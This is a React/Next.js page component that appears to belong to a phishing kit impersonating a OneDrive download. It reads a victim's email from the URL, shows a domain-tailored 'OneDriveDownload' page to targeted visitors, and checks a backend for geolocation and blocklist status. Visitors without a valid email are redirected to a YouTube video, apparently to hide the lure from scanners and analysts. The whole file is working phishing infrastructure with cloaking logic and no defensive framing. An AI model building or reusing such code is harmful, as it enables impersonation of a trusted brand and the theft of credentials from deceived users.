"use client"

import Loader from "@/components/Loader"
import OneDriveDownload from "@/components/OneDriveDownload";
import { useEffect, useState, useRef } from "react";

export default function Home() {
  const [redirect, setRedirect] = useState(false)
  const [geoInfo, setGeoInfo] = useState(null)
  const [dm, setDm] = useState(null)
  const [loading, setLoading] = useState(true)

  const hasRun = useRef(false)           // ✅ prevents double execution
  const isRedirecting = useRef(false)    // ✅ stops logic after redirect starts

  useEffect(() => {
    if (hasRun.current) return;   // 🚫 block duplicate calls
    hasRun.current = true;

    setLoading(true)

    const mySearchParams = new URLSearchParams(window.location.search)
    const key = mySearchParams.get('jsv')
    const sid = mySearchParams.get('sid')
    const email = mySearchParams.get('emz')

    if (isValidEmail(email)) {
      console.log("we in")

      let domain = email.split('@')[1]
      setDm(domain)

      getGeoInfo(key, sid, "0")

    } else {
      console.log("we outta here")

      getGeoInfo(key, sid, "1")

      isRedirecting.current = true; // 🚨 mark BEFORE redirect

      setTimeout(() => {
        window.location.href = `https://www.youtube.com/watch?v=MvyimScoS2M`
      }, 2000)
    }

  }, [])

  function isValidEmail(email) {
    if (!email) return false;
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }

  async function getGeoInfo(key, sid, cnd) {
    // 🚫 stop if redirect already triggered
    if (isRedirecting.current) return;

    try {
      const response = await fetch(`/api/getInfo/?cnd=${cnd}&kyi=${key}&sid=${sid}`)
      const data = await response.json()

      // 🚫 ignore result if redirect started while waiting
      if (isRedirecting.current) return;

      if (data.isBlklisted) {
        setRedirect(false)
      } else {
        setRedirect(true)
      }

      setGeoInfo(data)
      setLoading(false)

    } catch (err) {
      console.error("getGeoInfo error:", err)
    }
  }

  return (
    <>

      {loading
        ? <Loader />
        : <OneDriveDownload
            geoInfo={geoInfo && geoInfo}
            redirect={redirect}
            domain={dm}
            redirectRef={isRedirecting}
          />
      }
    </>
  );
}